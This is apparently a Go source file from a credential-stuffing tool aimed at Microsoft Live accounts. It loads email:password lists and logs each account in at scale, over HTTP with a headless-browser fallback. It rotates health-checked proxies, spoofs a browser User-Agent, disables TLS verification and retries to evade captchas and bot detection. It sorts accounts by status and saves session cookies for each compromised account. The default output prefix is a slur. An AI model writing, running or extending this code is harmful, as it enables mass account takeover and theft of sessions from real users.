package converter

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/csv"
	"errors"
	"fmt"
	"math"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/go-rod/rod"
)

// Options configures a conversion run.
type Options struct {
	InputPath   string
	OutputDir   string
	Prefix      string
	Concurrency int
	Retries     int
	Proxies     []string
	BrowserPath string
	Validate    bool // verify the session with the userinfo endpoint
	DryRun      bool
	OnStatus    func(string) // status lines (proxy filtering, etc.)
}

// Progress is a snapshot of a running conversion.
type Progress struct {
	Total      int     `json:"total"`
	Processed  int     `json:"processed"`
	Success    int     `json:"success"`
	Failed     int     `json:"failed"`
	MFA        int     `json:"mfa"`
	Invalid    int     `json:"invalid"`
	Locked     int     `json:"locked"`
	Captcha    int     `json:"captcha"`
	Skipped    int     `json:"skipped"`
	Current    string  `json:"current"`
	RatePerMin float64 `json:"rate_per_min"`
	ETA        int64   `json:"eta_seconds"`
}

// Result is the final outcome of a run.
type Result struct {
	Total     int
	Parsed    int
	Duplicate int
	Unparsed  int
	DryRun    bool
	Final     Progress
	OutDir    string
	CSVPath   string
	FailPath  string
}

// proxyPool keeps one keep-alive transport per proxy so connections are
// reused and proxies are load-balanced round-robin. A nil proxy means direct.
type proxyPool struct {
	transports []*http.Transport
	counter    atomic.Uint64
}

func newProxyPool(proxies []string) *proxyPool {
	if len(proxies) == 0 {
		proxies = []string{""}
	}
	pool := &proxyPool{transports: make([]*http.Transport, len(proxies))}
	for i, p := range proxies {
		if p == "" {
			pool.transports[i] = &http.Transport{
				TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
				MaxIdleConns:          64,
				MaxIdleConnsPerHost:   8,
				IdleConnTimeout:       60 * time.Second,
				ResponseHeaderTimeout: 8 * time.Second,
			}
			continue
		}
		u, err := url.Parse(p)
		if err != nil {
			pool.transports[i] = pool.transports[0]
			continue
		}
		pool.transports[i] = &http.Transport{
			Proxy:                 http.ProxyURL(u),
			TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:          64,
			MaxIdleConnsPerHost:   8,
			IdleConnTimeout:       60 * time.Second,
			ResponseHeaderTimeout: 8 * time.Second,
		}
	}
	return pool
}

func (p *proxyPool) client() *http.Client {
	i := p.counter.Add(1)
	return NewHTTPClient(p.transports[(i-1)%uint64(len(p.transports))])
}

// filterHealthyProxies concurrently probes every proxy against the real
// login endpoint and returns only the ones that respond. Dead proxies
// otherwise burn a full ResponseHeaderTimeout on every retry.
func filterHealthyProxies(ctx context.Context, proxies []string, onStatus func(string)) []string {
	if len(proxies) <= 1 {
		return proxies
	}
	if onStatus != nil {
		onStatus("Filtering " + fmt.Sprintf("%d", len(proxies)) + " proxies (this takes a few seconds)...")
	}
	var (
		mu      sync.Mutex
		healthy []string
		wg      sync.WaitGroup
	)
	for _, p := range proxies {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			if !probeProxy(ctx, p) {
				return
			}
			mu.Lock()
			healthy = append(healthy, p)
			mu.Unlock()
		}(p)
	}
	// Wait for all probes, but bail early if the run is cancelled.
	wait := make(chan struct{})
	go func() {
		wg.Wait()
		close(wait)
	}()
	select {
	case <-wait:
	case <-ctx.Done():
	}
	return healthy
}

func probeProxy(ctx context.Context, proxy string) bool {
	u, err := url.Parse(proxy)
	if err != nil {
		return false
	}
	tr := &http.Transport{
		Proxy:                 http.ProxyURL(u),
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		ResponseHeaderTimeout: 4 * time.Second,
	}
	defer tr.CloseIdleConnections()
	client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
	req, err := http.NewRequestWithContext(ctx, "GET", "https://login.live.com/", nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode >= 200 && resp.StatusCode < 400
}

// Run executes the conversion. OnProgress is invoked after each account
// completes (never concurrently with itself). It returns once all accounts
// are handled or ctx is cancelled.
func Run(ctx context.Context, opts Options, onProgress func(Progress)) (Result, error) {
	if opts.Prefix == "" {
		opts.Prefix = "retard"
	}
	if opts.Concurrency < 1 {
		opts.Concurrency = 1
	}
	if opts.Concurrency > 50 {
		opts.Concurrency = 50
	}
	if opts.Retries < 0 {
		opts.Retries = 0
	}
	if opts.Retries > 5 {
		opts.Retries = 5
	}
	creds, duplicates, unparsed, err := loadCredentials(opts.InputPath)
	if err != nil {
		return Result{}, err
	}
	res := Result{Total: len(creds), Duplicate: duplicates, Unparsed: unparsed, Parsed: len(creds), DryRun: opts.DryRun}
	if opts.DryRun {
		return res, nil
	}

	if err := os.MkdirAll(opts.OutputDir, 0o755); err != nil {
		return Result{}, err
	}

	var (
		mu      sync.Mutex
		prog    Progress
		started = time.Now()
	)
	prog.Total = len(creds)
	emit := func() {
		mu.Lock()
		defer mu.Unlock()
		elapsed := time.Since(started)
		if prog.Processed > 0 && elapsed > 0 {
			rate := float64(prog.Processed) / elapsed.Minutes()
			prog.RatePerMin = math.Round(rate*100) / 100
			if rate > 0 {
				remaining := prog.Total - prog.Processed
				if elapsed > 30*time.Second {
					prog.ETA = int64(float64(remaining) / rate * 60)
				}
			}
		}
		p := prog
		if onProgress != nil {
			onProgress(p)
		}
	}

	csvPath := filepath.Join(opts.OutputDir, "conversion_log.csv")
	csvFile, err := os.Create(csvPath)
	if err != nil {
		return Result{}, err
	}
	defer csvFile.Close()
	writer := csv.NewWriter(csvFile)
	if err := writer.Write([]string{"email", "password", "status", "message", "retries"}); err != nil {
		return Result{}, err
	}

	failPath := filepath.Join(opts.OutputDir, "failed_credentials.txt")
	failFile, err := os.Create(failPath)
	if err != nil {
		return Result{}, err
	}
	defer failFile.Close()

	proxies := opts.Proxies
	if len(proxies) > 1 {
		proxies = filterHealthyProxies(ctx, proxies, opts.OnStatus)
	}
	if len(proxies) == 0 {
		proxies = nil
		if len(opts.Proxies) > 1 && opts.OnStatus != nil {
			opts.OnStatus("All proxies failed the health check - running direct")
		}
	} else if opts.OnStatus != nil {
		opts.OnStatus(fmt.Sprintf("%d/%d proxies alive", len(proxies), len(opts.Proxies)))
	}
	pool := newProxyPool(proxies)

	// One lazily-launched fallback browser, used only when the HTTP path hits
	// a captcha or an unexpected page. Serialized so RAM stays minimal.
	var (
		fallbackMu  sync.Mutex
		fallbackSet bool
		fallbackB   *rod.Browser
		fallbackErr error
	)
	getFallbackBrowser := func() (*rod.Browser, error) {
		fallbackMu.Lock()
		defer fallbackMu.Unlock()
		if !fallbackSet {
			fallbackSet = true
			proxy := ""
			if len(proxies) > 0 {
				proxy = proxies[0]
			}
			fallbackB, fallbackErr = LaunchBrowser(ctx, BrowserOpts{
				BrowserPath: opts.BrowserPath,
				Proxy:       proxy,
			})
		}
		return fallbackB, fallbackErr
	}
	defer func() {
		fallbackMu.Lock()
		if fallbackB != nil {
			fallbackB.Close()
		}
		fallbackMu.Unlock()
	}()

	var (
		wg     sync.WaitGroup
		slot   = make(chan struct{}, opts.Concurrency)
		written int64 // rows since last CSV flush
	)
	flushCSV := func() {
		writer.Flush()
		atomic.StoreInt64(&written, 0)
	}

	for i := range creds {
		select {
		case <-ctx.Done():
			goto done
		default:
		}
		slot <- struct{}{}
		wg.Add(1)
		go func(c Credential) {
			defer wg.Done()
			defer func() { <-slot }()
			defer func() {
				if rec := recover(); rec != nil {
					mu.Lock()
					prog.Processed++
					prog.Failed++
					mu.Unlock()
					writer.Write([]string{c.Email, c.Password, string(StatusSkipped), fmt.Sprintf("panic: %v", rec), "0"})
					if atomic.AddInt64(&written, 1)%64 == 0 {
						flushCSV()
					}
					fmt.Fprintln(failFile, c.Raw)
					emit()
				}
			}()

			mu.Lock()
			prog.Current = c.Email
			mu.Unlock()

			var (
				cks     []Cookie
				tok     string
				st      Status
				message string
				attempt = 0
			)

			// Fast path: plain HTTP login (no browser). Retry transient
			// failures; captcha / unexpected pages go to the browser once.
			for {
				attempt++
				client := pool.client()
				cks, tok, st = HTTPLoginLive(client, c.Email, c.Password)
				if st == StatusSuccess && opts.Validate {
					if !ValidateSession(ctx, tok, cks, client) {
						st = StatusExtract
					}
				}
				switch st {
				case StatusSuccess, StatusMFA, StatusInvalid, StatusLocked:
					goto final
				case StatusCaptcha, StatusDOM:
					// MS bot-checks the proxy IP; retry over a different
					// proxy first, browser as last resort.
					if attempt <= opts.Retries {
						message = "proxy flagged, retry"
						continue
					}
					cks, tok, st = browserFallback(ctx, getFallbackBrowser, c, opts.Validate, &message)
					goto final
				default: // network / timeout / extract
					if attempt <= opts.Retries {
						message = "retry"
						select {
						case <-ctx.Done():
							st = StatusSkipped
							goto final
						case <-time.After(time.Duration(rand.Int63n(3_000)+1_000) * time.Millisecond):
						}
						continue
					}
					goto final
				}
			}

		final:
			retries := attempt - 1
			if st == StatusSuccess {
				name, err := NewCookieFileName(opts.OutputDir, opts.Prefix)
				if err != nil {
					message = "filename: " + err.Error()
					st = StatusSkipped
				} else if err := WriteAtomic(opts.OutputDir, name, []byte(FormatCookieFile(cks))); err != nil {
					message = "write: " + err.Error()
					st = StatusSkipped
				} else {
					message = name
				}
			}

			mu.Lock()
			prog.Processed++
			switch st {
			case StatusSuccess:
				prog.Success++
			case StatusMFA:
				prog.MFA++
			case StatusInvalid:
				prog.Invalid++
			case StatusLocked:
				prog.Locked++
			case StatusCaptcha:
				prog.Captcha++
			case StatusSkipped:
				prog.Skipped++
			default:
				prog.Failed++
			}
			mu.Unlock()

			writer.Write([]string{c.Email, c.Password, string(st), message, fmt.Sprintf("%d", retries)})
			if atomic.AddInt64(&written, 1)%64 == 0 {
				flushCSV()
			}
			if st == StatusInvalid || st == StatusLocked || st == StatusSkipped || st == StatusCaptcha ||
				st == StatusNetwork || st == StatusTimeout || st == StatusDOM || st == StatusExtract {
				fmt.Fprintln(failFile, c.Raw)
			}
			mu.Lock()
			prog.Current = ""
			mu.Unlock()
			emit()
		}(creds[i])
	}
done:
	wg.Wait()
	flushCSV()

	res.Final = prog
	res.OutDir = opts.OutputDir
	res.CSVPath = csvPath
	res.FailPath = failPath
	return res, nil
}

// browserFallback runs one account through the headless browser. Serialized
// via the browser mutex so at most one Chrome page is alive at a time.
func browserFallback(ctx context.Context, getBrowser func() (*rod.Browser, error), c Credential, validate bool, message *string) ([]Cookie, string, Status) {
	b, err := getBrowser()
	if err != nil {
		*message = "browser: " + err.Error()
		return nil, "", StatusSkipped
	}
	sleepFn := func() {
		select {
		case <-time.After(time.Duration(1000+rand.Int63n(2000)) * time.Millisecond):
		case <-ctx.Done():
		}
	}
	cks, tok, st, err := LoginLive(ctx, b, c.Email, c.Password, sleepFn, nil)
	if err != nil && ctx.Err() != nil {
		return nil, "", StatusSkipped
	}
	if st == StatusSuccess && validate && tok != "" {
		if !ValidateSession(ctx, tok, cks, nil) {
			return cks, tok, StatusExtract
		}
	}
	return cks, tok, st
}

func loadCredentials(path string) ([]Credential, int, int, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, 0, 0, err
	}
	defer f.Close()

	var (
		out  []Credential
		seen = make(map[string]bool)
		dup  int
		bad  int
	)
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1024*1024), 1024*1024)
	for sc.Scan() {
		c, ok := ParseCredential(sc.Text())
		if !ok {
			bad++
			continue
		}
		key := strings.ToLower(c.Email)
		if seen[key] {
			dup++
			continue
		}
		seen[key] = true
		out = append(out, c)
	}
	if err := sc.Err(); err != nil {
		return nil, 0, 0, err
	}
	if len(out) == 0 {
		return nil, 0, 0, errors.New("no valid email:password lines found in input file")
	}
	return out, dup, bad, nil
}
